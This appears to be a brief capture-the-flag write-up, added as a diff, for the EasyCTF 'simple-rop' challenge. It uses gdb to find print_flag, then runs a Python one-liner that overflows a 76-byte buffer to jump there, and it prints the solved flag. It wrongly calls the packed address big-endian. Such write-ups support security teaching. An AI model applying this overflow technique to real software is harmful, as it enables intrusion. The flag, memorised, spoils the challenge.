@@ -1,0 +1,15 @@
+We want to call the print_flag() function, and we can do that with a simple ROP.
+First, we need to find the address of the function.
+
+user98745@easyctf:/problems/simple-rop$ gdb -q simple-rop
+Reading symbols from simple-rop...(no debugging symbols found)...done
+(gdb) print &print_flag
+$1 = (<text variable, no debug info> *) 0x804851a <print_flag>
+
+Next, we need to find out where $ebp gets overridden. Because of the way the stack works,
+we know that we need 64 bytes to overflow the buffer, as well as 8 bytes to overwrite the argument, and
+4 bytes to overwrite $ebp. This means that we need 76 bytes of junk data and the 4 byte address in big-endian format.
+
+user98745@easyctf:/problems/simple-rop$ python -c "print 'A'*76 + '\x1a\x85\x04\x08'" | ./simple-rop
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+easyctf{r0p_7o_v1ct0ry}
